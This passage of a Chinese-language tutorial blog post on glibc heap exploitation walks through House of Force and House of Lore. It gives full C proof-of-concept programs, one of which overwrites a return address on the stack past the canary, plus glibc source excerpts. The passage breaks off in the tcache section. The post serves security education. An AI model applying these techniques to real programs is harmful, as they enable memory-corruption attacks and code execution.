class="built_in">stderr</span>, <span class="string">&quot;The top chunk is a special chunk. Is the last in memory &quot;</span></span><br><span class="line"><span class="string">&quot;and is the chunk that will be resized when malloc asks for more space from the os.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIn the end, we will use this to overwrite a variable at %p.\n&quot;</span>, bss_var);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Its current value is: %s\n&quot;</span>, bss_var);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nLet&#x27;s allocate the first chunk, taking space from the wilderness.\n&quot;</span>);</span><br><span class="line"><span class="keyword">intptr_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk of 256 bytes has been allocated at %p.\n&quot;</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> real_size = malloc_usable_size(p1);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Real size (aligned and all that jazz) of our allocated chunk is %ld.\n&quot;</span>, real_size + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow let&#x27;s emulate a vulnerability that can overwrite the header of the Top Chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//----- VULNERABILITY ----</span></span><br><span class="line"><span class="keyword">intptr_t</span> *ptr_top = (<span class="keyword">intptr_t</span> *) ((<span class="keyword">char</span> *)p1 + real_size - <span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe top chunk starts at %p\n&quot;</span>, ptr_top);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Old size of top chunk %#llx\n&quot;</span>, *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> *)((<span class="keyword">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="keyword">long</span>))));</span><br><span class="line">*(<span class="keyword">intptr_t</span> *)((<span class="keyword">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">-1</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;New size of top chunk %#llx\n&quot;</span>, *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> *)((<span class="keyword">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="keyword">long</span>))));</span><br><span class="line"><span class="comment">//------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n&quot;</span></span><br><span class="line">   <span class="string">&quot;Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n&quot;</span></span><br><span class="line">   <span class="string">&quot;overflow) and will then be able to allocate a chunk right over the desired region.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):</span></span><br><span class="line"><span class="comment"> * new_top = old_top + nb</span></span><br><span class="line"><span class="comment"> * nb = new_top - old_top</span></span><br><span class="line"><span class="comment"> * req + 2sizeof(long) = new_top - old_top</span></span><br><span class="line"><span class="comment"> * req = new_top - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment"> * req = dest - 2sizeof(long) - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment"> * req = dest - old_top - 4*sizeof(long)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> evil_size = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)bss_var - <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">4</span> - (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr_top;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n&quot;</span></span><br><span class="line">   <span class="string">&quot;we will malloc %#lx bytes.\n&quot;</span>, bss_var, ptr_top, evil_size);</span><br><span class="line"><span class="keyword">void</span> *new_ptr = <span class="built_in">malloc</span>(evil_size);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;As expected, the new pointer is at the same place as the old top chunk: %p\n&quot;</span>, new_ptr - <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* ctr_chunk = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow, the next chunk we overwrite will point at our target buffer.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(100) =&gt; %p!\n&quot;</span>, ctr_chunk);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we can finally overwrite that value:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... old string: %s\n&quot;</span>, bss_var);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... doing strcpy overwrite with \&quot;YEAH!!!\&quot;...\n&quot;</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(ctr_chunk, <span class="string">&quot;YEAH!!!&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... new string: %s\n&quot;</span>, bss_var);</span><br><span class="line"></span><br><span class="line">assert(ctr_chunk == bss_var);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// some further discussion:</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n&quot;);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;This because the main_arena-&gt;top pointer is setted to current av-&gt;top + malloc_size &quot;</span></span><br><span class="line"><span class="comment">//&quot;and we \nwant to set this result to the address of malloc_got_address-8\n\n&quot;);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n&quot;);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;The av-&gt;top after this big malloc will be setted in this way to malloc_got_address-8\n\n&quot;);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;After that a new call to malloc will return av-&gt;top+8 ( +8 bytes for the header ),&quot;</span></span><br><span class="line"><span class="comment">//&quot;\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;The large chunk with evil_size has been allocated here 0x%08x\n&quot;,p2);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;The main_arena value av-&gt;top has been setted to malloc_got_address-8=0x%08x\n&quot;,malloc_got_address);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;This last malloc will be served from the remainder code and will return the av-&gt;top+8 injected before\n&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的poc很清楚了，可以下去-g调一下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): corrupted top size&quot;</span>);</span><br></pre></td></tr></table></figure><p>以上片段是在glibc2.29当中新加的导致无法进行此种方法了。</p><h2 id="house-of-lora"><a href="#house-of-lora" class="headerlink" title="house of lora"></a>house of lora</h2><h3 id="Glibc2-23"><a href="#Glibc2-23" class="headerlink" title="Glibc2.23"></a>Glibc2.23</h3><p>这个攻击方式是针对small bin的攻击，先看源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">&#123;</span><br><span class="line">    idx = smallbin_index (nb);</span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            malloc_consolidate (av);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            bck = victim-&gt;bk;</span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">            &#123;</span><br><span class="line">                errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">            &#125;</span><br><span class="line">            set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">            bin-&gt;bk = bck;</span><br><span class="line">            bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">            check_malloced_chunk (av, victim, nb);</span><br><span class="line">            <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到上面的操作是将最后一个chunk的bk赋值给bck，然后再把bin-&gt;bk=bck就把这个small bin chunk加入到了small bin中去了，不过需要绕过bck-&gt;fd!=victim，这里给出poc：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Advanced exploitation of the House of Lore - Malloc Maleficarum.</span></span><br><span class="line"><span class="comment">This PoC take care also of the glibc hardening of smallbin corruption.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">[ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">else</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      bck = victim-&gt;bk;</span></span><br><span class="line"><span class="comment">    if (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</span></span><br><span class="line"><span class="comment">                  goto errout;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       set_inuse_bit_at_offset (victim, nb);</span></span><br><span class="line"><span class="comment">       bin-&gt;bk = bck;</span></span><br><span class="line"><span class="comment">       bck-&gt;fd = bin;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       [ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">jackpot</span><span class="params">()</span></span>&#123; <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nWelcome to the House of Lore\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is tested against Ubuntu 16.04.6 - 64bit - glibc-2.23\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="keyword">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake chunk on the stack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span></span><br><span class="line">         <span class="string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span></span><br><span class="line">         <span class="string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span></span><br><span class="line">         <span class="string">&quot;chunk on stack&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_1;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">         <span class="string">&quot;the small one during the free()\n&quot;</span>);</span><br><span class="line">  <span class="keyword">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are nil\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = malloc(0x100)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="keyword">intptr_t</span> sc = (<span class="keyword">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line">  <span class="built_in">memcpy</span>((p4+<span class="number">40</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  assert((<span class="keyword">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="keyword">long</span>)jackpot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一样的上面的poc确实写的非常详细，自己下去调</p><h3 id="Glibc-2-27后"><a href="#Glibc-2-27后" class="headerlink" title="Glibc 2.27后"></a>Glibc 2.27后</h3><p>此时就出现了tcache，存在了前几天的机制：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">&#123;</span><br><span class="line">    idx = smallbin_index (nb);</span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">    &#123;</span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">        set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">        bin-&gt;bk = bck;</span><br><span class="line">        bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">            set_non_main_arena (victim);</span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">        <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">        <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">        <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">            mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">            <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">                   &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    bck = tc_victim-&gt;bk;</span><br><span class="line">                    set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">                    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                        set_non_main_arena (tc_victim);</span><br><span class="line">                    bin-&gt;bk = bck;</span><br><span class="line">                    bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">                    tcache_put (tc_victim, tc_idx);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们把chunk放进了small bin就会马上进入到tcache内，并且还是个while循环，所以其实有了tcache之后这个就很难利用了，但是依旧是可以利用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 